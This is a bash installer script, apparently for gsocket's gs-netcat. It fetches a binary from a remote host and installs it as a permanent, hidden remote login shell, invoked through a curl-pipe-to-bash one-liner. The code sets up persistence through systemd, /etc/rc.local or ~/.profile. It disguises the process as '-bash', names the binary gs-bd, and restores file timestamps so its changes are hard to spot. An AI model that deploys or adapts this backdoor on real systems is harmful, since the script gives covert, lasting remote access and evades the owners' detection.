#! /usr/bin/env bash

# Install and start a permanent gs-netcat remote login shell
#
# This script is typically invoked like this as root or non-root user:
# $ bash -c "$(curl -fsSL gsocket.io/x)"
# $ bash -c "$(curl -L gsocket.io/x)"
#
# This can be used when:
# - gs-netcat is _not_ installed
# - quick way to retain access to any shell (root and non-root)
#
# E.g. This command installs and starts a reverse shell:
# $ bash -c "$(curl -fsSL gsocket.io/x)"
#
# Steps taken:
# 1. Download pre-compiled binary
# 2. Create a new secret (random)
# 3. Start gs-netcat as interactive remote login shell
# 4. Install gs-netcat to start automatically after reboot

# Global Defines
URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
URL_DEPLOY="gsocket.io/x"
DL_CMD="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
BIN_HIDDEN_NAME_DEFAULT=gs-bd
PROC_HIDDEN_NAME_DEFAULT=-bash
CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

exit_clean()
{
	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR}/"*; rmdir "${TMPDIR}"; } &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
}

exit_code()
{
	exit_clean

	exit "$1"
}

errexit()
{
	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"

	exit_code 255
}

# When all was successfull
exit_alldone()
{
	echo 1>&1 "$*"
	exit_code 0
}

# Called _after_ init_vars() at the end of init_setup.
init_dstbin()
{
	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
	# Try systemwide installation first
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try user installation
	mkdir -p "${GS_PREFIX}${HOME}/.usr/bin" &>/dev/null
	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try /dev/shm 
	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }

	# Try /tmp/.gs as last resort
	DSTBIN="${TMPDIR}/${BIN_HIDDEN_NAME}"
	touch "$DSTBIN" &>/dev/null && { return; }
	
	errexit "FAILED. Can not find writeable directory."
}

init_vars()
{
	# Select binary
	local arch
	arch=$(uname -m)
	if [[ $OSTYPE == *linux* ]]; then 
		if [[ x"$arch" == "xi686" ]]; then
			SRC_PKG="gs-netcat_i686-debian.tar.gz"
		elif [[ x"$arch" == "xarmv6l" ]]; then
			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
		else
			SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
		fi
	elif [[ $OSTYPE == *darwin* ]]; then
			SRC_PKG="gs-netcat_x86_64-osx.tar.gz"
	elif [[ $OSTYPE == *FreeBSD* ]]; then
			SRC_PKG="gs-netcat_x86_64-freebsd.tar.gz"
	elif [[ $OSTYPE == *cygwin* ]]; then
			SRC_PKG="gs-netcat_x86_64-cygwin.tar.gz"
	fi
	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort

	if [[ -d /dev/shm ]]; then
		TMPDIR="/dev/shm/.gs"
	elif [[ -d /tmp ]]; then
		TMPDIR="/tmp/.gs"
	fi

	# Docker does not set USER
	[[ -z $USER ]] && USER=$(id -un)
	[[ -z $UID ]] && UID=$(id -u)

	# OSX's pkill matches the hidden name and not the original binary name.
	# Because we hide as '-bash' we can not pkill all -bash.
	# 'killall' however matches gs-bd and on OSX we thus force killall
	if [[ $OSTYPE == *darwin* ]]; then
		KL_CMD="killall"
		KL_CMD_UARG="-u${USER}"
	elif command -v pkill >/dev/null; then
		KL_CMD="pkill"
		KL_CMD_UARG="-U${UID}"
	elif command -v killall >/dev/null; then
		KL_CMD="killall"
		# cygwin's killall needs the name (not the uid)
		KL_CMD_UARG="-u${USER}"
	fi

	command -v $KL_CMD >/dev/null || errexit "Need pkill or killall."

	# Defaults
	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
	
	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
	PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"

	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"

	RC_FILE="${GS_PREFIX}${HOME}/.profile"

	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
}

init_setup()
{
	if [[ -n "$GS_PREFIX" ]]; then
		# Debuggin and testing into separate directory
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [[ -f "${HOME}/.profile" ]]; then
			cp "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
			touch -r "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
		fi
		cp /etc/rc.local "${GS_PREFIX}/etc/"
		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
	fi

	mkdir "$TMPDIR" &>/dev/null

	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
	rm -f "${TMPDIR}/.gs-${UID}.lock" 2>/dev/null

	# Find out which directory is writeable
	init_dstbin
}

uninstall_rm()
{
	[[ -z "$1" ]] && return
	[[ ! -f "$1" ]] && return # return if file does not exist

	echo 1>&2 "Removing $1..."
	rm -rf "$1"
}

uninstall_rmdir()
{
	[[ -z "$1" ]] && return
	[[ ! -d "$1" ]] && return # return if file does not exist

	echo 1>&2 "Removing $1..."
	rmdir "$1"
}

uninstall_rc()
{
	[[ ! -f "$1" ]] && return # File does not exist

	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed

	grep -v "${BIN_HIDDEN_NAME}" "$1" >"${1}-new" 2>/dev/null
	[[ ! -f "${1}-new" ]] && return # permission denied

	touch -r "$1" "${1}-new"
	mv "${1}-new" "$1"
	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
}

# Rather important function especially when testing and developing this...
uninstall()
{
	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"

	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
	uninstall_rm "/dev/shm/${SEC_NAME}"

	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr/bin"
	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr"

	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
	uninstall_rm "${TMPDIR}/${SRC_PKG}"
	uninstall_rmdir "${TMPDIR}"

	# Remove from login script
	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
	uninstall_rc "${GS_PREFIX}/etc/rc.local"

	# Remove systemd service
	# STOPPING would kill the current login shell. Do not stop it.
	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; } 
	uninstall_rm "${SERVICE_FILE}"
	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"

	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
	echo -e 1>&2 "--> Type ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
	exit 0
}

SKIP_OUT()
{
	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

OK_OUT()
{
	echo -e 1>&2 "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

FAIL_OUT()
{
	echo -e 1>&2 "..[${CR}FAILED${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

WARN_OUT()
{
	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
}

gs_secret_reload()
{
	GS_SECRET="UNKNOWN"
	local sec
	sec=$(<"$1")
	[[ ${#sec} -gt 10 ]] && GS_SECRET=$sec
}

gs_secret_write()
{
	echo "$GS_SECRET" >"$1"
	chmod 600 "$1"
}

install_system_systemd()
{
	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
	command -v systemctl >/dev/null || return
	SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	if [[ -f "${SERVICE_FILE}" ]]; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		gs_secret_reload "$SEC_FILE" 
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi

	# Create the service file
	echo "[Unit]
Description=gs
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
Environment=\"GSOCKET_ARGS=-k $SEC_FILE -ilq\"
ExecStart=/bin/bash -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"

[Install]
WantedBy=multi-user.target" >"${SERVICE_FILE}"

	chmod 600 "${SERVICE_FILE}"
	gs_secret_write "$SEC_FILE"

	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
	systemctl start "${SERVICE_HIDDEN_NAME}" && \
	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work...

	IS_SYSTEMD=1
	IS_GS_RUNNING=1
	IS_INSTALLED=1
}

install_system_rclocal()
{
	[[ ! -f "${RCLOCAL_FILE}" ]] && return
	SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		gs_secret_reload "$SEC_FILE" 
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return	
	fi

	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
	(head -n1 "${RCLOCAL_FILE}" && \
	echo "HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" $(which bash) -c \"cd /root; exec -a $PROC_HIDDEN_NAME $DSTBIN\"" && \
	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable

	# restore file's timestamp
	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"

	gs_secret_write "$SEC_FILE"

	IS_INSTALLED=1
}

install_system()
{
	# Try systemd first
	install_system_systemd
	[[ -n $IS_INSTALLED ]] && return

	# Try good old /etc/rc.local
	install_system_rclocal
	[[ -n $IS_INSTALLED ]] && return
}

install_user()
{
	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
	SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
		IS_INSTALLED=1
		IS_SKIPPED=1
		gs_secret_reload "$SEC_FILE"
		SKIP_OUT "Already installed in ${RC_FILE}"
		return
	fi

	(echo "command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})" && \
	cat "${RC_FILE}") >"${RC_FILE}-new"

	touch -r "${RC_FILE}" "${RC_FILE}-new"
	mv "${RC_FILE}-new" "${RC_FILE}"

	gs_secret_write "$SEC_FILE"

	IS_INSTALLED=1
}

# Download $1 and save it to $2
dl()
{
	[[ -s "$2" ]] && return

	local dl_log

	# Debugging / testing. Use local package if available
	[[ -n "$GS_DEBUG" ]] && [[ -f "../tools/${1}" ]] && cp "../tools/${1}" "${2}" 2>/dev/null && return

	if command -v curl >/dev/null; then
		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
	elif command -v wget >/dev/null; then
		dl_log=$(wget --show-progress -O "$2" "${URL_BASE}/${1}" 2>&1)
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt-get install curl${CN}"
		errexit
	fi

	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$dl_log"; exit_code 255; } 
}

init_vars

[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall

init_setup

# Download binaries
echo -en 2>&1 "Downloading binaries.................................................."
# echo -e 2>&1 "Downloading binaries..."
dl "$SRC_PKG" "${TMPDIR}/${SRC_PKG}"
OK_OUT

echo -en 2>&1 "Copying binaries......................................................"
# Unpack
(cd "${TMPDIR}" && tar xfz "${SRC_PKG}") || { FAIL_OUT "unpacking failed"; errexit; }

mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
chmod 700 "$DSTBIN"
OK_OUT

GS_SECRET=$("$DSTBIN" -g)
[[ -z "$GS_SECRET" ]] && { FAIL_OUT "Execution failed...wrong binary?"; errexit; }

# -----BEGIN Install permanentally-----
echo -en 2>&1 "Installing remote access permanentally................................"

# Try to install system wide. This will also start the service.
[[ $UID -eq 0 ]] && install_system

# Try to install to user's login script
[[ -z $IS_INSTALLED ]] && install_user
# -----END Install permanentally-----

if [[ -z "$IS_INSTALLED" ]]; then
	FAIL_OUT "Access will be lost after reboot."
elif [[ -z "$IS_SKIPPED" ]]; then
	OK_OUT
fi
echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"

printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [[ -n "$IS_SYSTEMD" ]]; then
	# HERE: It's systemd
	if [[ -z "$IS_GS_RUNNING" ]]; then
		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		else
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255
		fi
	fi
	if [[ -n "$IS_SKIPPED" ]]; then
		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
	else
		OK_OUT
	fi
elif [[ -z "$IS_GS_RUNNING" ]]; then
	# Scenario to consider:
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
	# Now two gs-bd's are running (which is correct)
	${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
	IS_NEED_START=1
	if [[ -n "$IS_OLD_RUNNING" ]]; then
		# HERE: already running.
		if [[ -n "$IS_SKIPPED" ]]; then
			# HERE: Already running. Skipped installation (sec.dat has not changed).
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			OK_OUT
			WARN_OUT "More than one ${BIN_HIDDEN_NAME} is running. You"
			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
		fi
	else
		OK_OUT ""
	fi
	if [[ -n "$IS_NEED_START" ]]; then
		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
		IS_GS_RUNNING=1
	fi
fi

echo -e 1>&2 "--> Type ${CM}gs-netcat -s \"$GS_SECRET\" -i${CN} to connect."


exit_code 0
